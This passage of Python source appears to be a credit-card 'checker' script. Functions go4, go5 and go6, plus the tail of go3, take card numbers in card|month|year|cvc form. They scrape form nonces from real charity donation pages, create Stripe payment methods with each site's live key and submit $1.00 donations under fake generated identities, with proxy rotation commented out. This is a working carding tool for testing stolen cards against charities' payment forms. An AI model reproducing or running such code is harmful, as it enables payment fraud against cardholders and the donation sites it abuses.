        print(f"G3 ID Response: {campaign_id}")
        print(f"G3 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F9390d43c1d%3B+stripe-js-v3%2F9390d43c1d%3B+card-element&referrer=https%3A%2F%2Fmoffittlegacyfoundation.org&time_on_page=20929&client_attribution_metadata[client_session_id]=82f8cd5d-08cf-48a0-837f-9f5768089e71&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Qn25AKOe28Np3cyqzOlt9G23838aZejSaGl8TI2K5jI4s56jghH15bMCFr8JWgwIjUrLHqFCILKmpYvNOVHexn3007aNZ9jsH'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G3 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '_ga': 'GA1.1.1745641487.1764277891',
    '__stripe_mid': '1565da00-12ba-41c0-bfb5-093c8235799aa80493',
    'charitable_session': 'cadcb16531e05f3bcf03fbfe5b24a69e||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-08%2005%3A12%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fmoffittlegacyfoundation.org%2Fgive%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-12-08%2005%3A12%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fmoffittlegacyfoundation.org%2Fgive%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmoffittlegacyfoundation.org%2Fgive%2F',
    '__stripe_sid': 'b5d877f1-e69c-49db-9fe9-029207360087a8d038',
    '_ga_KFPPM0S0M8': 'GS2.1.s1765172534$o2$g0$t1765172538$j56$l0$h0',
        }
        headers = {
    'authority': 'moffittlegacyfoundation.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://moffittlegacyfoundation.org',
    'pragma': 'no-cache',
    'referer': 'https://moffittlegacyfoundation.org/give/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/give/',
    'campaign_id': f'{campaign_id}',
    'description': 'Texas Hill Country Flood Relief',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://moffittlegacyfoundation.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51Qn25AKOe28Np3cyqzOlt9G23838aZejSaGl8TI2K5jI4s56jghH15bMCFr8JWgwIjUrLHqFCILKmpYvNOVHexn3007aNZ9jsH',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
  
#============================================
# --- Main CC Check Function ---
def go4(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
            'authority': 'nanda.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'cache-control': 'max-age=0',
            # 'cookie': 'charitable_session=028bb31d8c8cda271c3324f85685aeeb||86400||82800; _ga=GA1.1.1635111792.1766984128; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __stripe_mid=77f88749-f5aa-422c-9f7d-d9ca9aed99559eaa39; __stripe_sid=f398b709-3665-4086-b4a6-2f8dc60b67258843ad; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F; _ga_24R744NQFJ=GS2.1.s1766984127$o1$g1$t1766984910$j60$l0$h0',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        
        response = requests.get('https://nanda.org/nanda-i-foundation/support-nanda-foundation/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G4 ID Response: {form_id}")
        print(f"G4 ID Response: {donation_nonce}")
        print(f"G4 ID Response: {campaign_id}")
        print(f"G4 ID Response: {donation_id}")
        	
        #2
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][postal_code]=10002&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fnanda.org&time_on_page=40644&client_attribution_metadata[client_session_id]=8fcfbd26-1b1c-4d6b-9b96-1f8f6cca5524&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Mosx3KEssoNl8ScsWR4VQojp8Rofrf8eVjiFS34QVJLbLTExFsVah44zWW8AgF7vbRGz3SOxQeA9511AcmtFQF200izpe2876'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G4 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
            'charitable_session': '028bb31d8c8cda271c3324f85685aeeb||86400||82800',
            '_ga_24R744NQFJ': 'GS2.1.s1766984127$o1$g0$t1766984127$j60$l0$h0',
            '_ga': 'GA1.1.1635111792.1766984128',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F',
            'cookielawinfo-checkbox-necessary': 'yes',
            'cookielawinfo-checkbox-non-necessary': 'yes',
            'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9',
            'viewed_cookie_policy': 'yes',
            '__stripe_mid': '77f88749-f5aa-422c-9f7d-d9ca9aed99559eaa39',
            '__stripe_sid': 'f398b709-3665-4086-b4a6-2f8dc60b67258843ad',
        }
        
        headers = {
            'authority': 'nanda.org',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'charitable_session=028bb31d8c8cda271c3324f85685aeeb||86400||82800; _ga_24R744NQFJ=GS2.1.s1766984127$o1$g0$t1766984127$j60$l0$h0; _ga=GA1.1.1635111792.1766984128; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __stripe_mid=77f88749-f5aa-422c-9f7d-d9ca9aed99559eaa39; __stripe_sid=f398b709-3665-4086-b4a6-2f8dc60b67258843ad',
            'origin': 'https://nanda.org',
            'referer': 'https://nanda.org/nanda-i-foundation/support-nanda-foundation/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'charitable_form_id': f'{form_id}',
            f'{form_id}': '',
            '_charitable_donation_nonce': f'{donation_nonce}',
            '_wp_http_referer': '/nanda-i-foundation/support-nanda-foundation/',
            'campaign_id': f'{campaign_id}',
            'description': 'NANDA Foundation Donations',
            'ID': f'{donation_id}',
            'gateway': 'stripe',
            'custom_donation_amount': '1.00',
            'first_name': 'Gen',
            'last_name': 'Paypal',
            'email': email,
            'stripe_payment_method': f'{pm}',
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response = requests.post('https://nanda.org/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51Mosx3KEssoNl8ScsWR4VQojp8Rofrf8eVjiFS34QVJLbLTExFsVah44zWW8AgF7vbRGz3SOxQeA9511AcmtFQF200izpe2876',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
    #proxies=proxy,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
        
#============================================
# --- Main CC Check Function ---
def go5(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://elgonfootballacademy.com/donate-now/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G5 ID Response: {form_id}")
        print(f"G5 ID Response: {donation_nonce}")
        print(f"G5 ID Response: {campaign_id}")
        print(f"G5 ID Response: {donation_id}")
        	
        #2
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=UG&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Felgonfootballacademy.com&time_on_page=29834&client_attribution_metadata[client_session_id]=87337ba0-9aba-4527-bd5a-67095b5ada6f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Rfv1gLm8eUsGSvPEeWPI4YcgdmbSB7U6xa7j8aTrQ5zCPklYnFEpPSrrsD3aQE1pSheyjPJ7akiObJ5rhoUqQug00N0Ng736F'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G5 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
            'charitable_session': 'd8598b7abc82b38d4aedc05226d6c85e||86400||82800',
            '__stripe_mid': '67d31c52-da1f-4712-920c-ff0b369d516f6d8de2',
            '__stripe_sid': '1c25e0c5-0938-4e62-b0e4-b35ee10a27ec290a35',
        }
        
        headers = {
            'authority': 'elgonfootballacademy.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'charitable_session=d8598b7abc82b38d4aedc05226d6c85e||86400||82800; __stripe_mid=67d31c52-da1f-4712-920c-ff0b369d516f6d8de2; __stripe_sid=1c25e0c5-0938-4e62-b0e4-b35ee10a27ec290a35',
            'origin': 'https://elgonfootballacademy.com',
            'referer': 'https://elgonfootballacademy.com/donate-now/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'charitable_form_id': f'{form_id}',
            f'{form_id}': '',
            '_charitable_donation_nonce': f'{donation_nonce}',
            '_wp_http_referer': '/donate-now/',
            'campaign_id': f'{campaign_id}',
            'description': 'Campaign',
            'ID': f'{donation_id}',
            'gateway': 'stripe',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Gen',
            'last_name': 'Paypal',
            'email': email,
            'address': '',
            'address_2': '',
            'city': '',
            'state': '',
            'postcode': '',
            'country': 'UG',
            'phone': '',
            'stripe_payment_method': f'{pm}',
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response = requests.post('https://elgonfootballacademy.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51Rfv1gLm8eUsGSvPEeWPI4YcgdmbSB7U6xa7j8aTrQ5zCPklYnFEpPSrrsD3aQE1pSheyjPJ7akiObJ5rhoUqQug00N0Ng736F',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 

#============================================
# --- Main CC Check Function ---
def go6(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://www.dohi.ca/campaigns/summer-camp-ukraine/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G6 ID Response: {form_id}")
        print(f"G6 ID Response: {donation_nonce}")
        print(f"G6 ID Response: {campaign_id}")
        print(f"G6 ID Response: {donation_id}")
        	
        #2
        headers = {
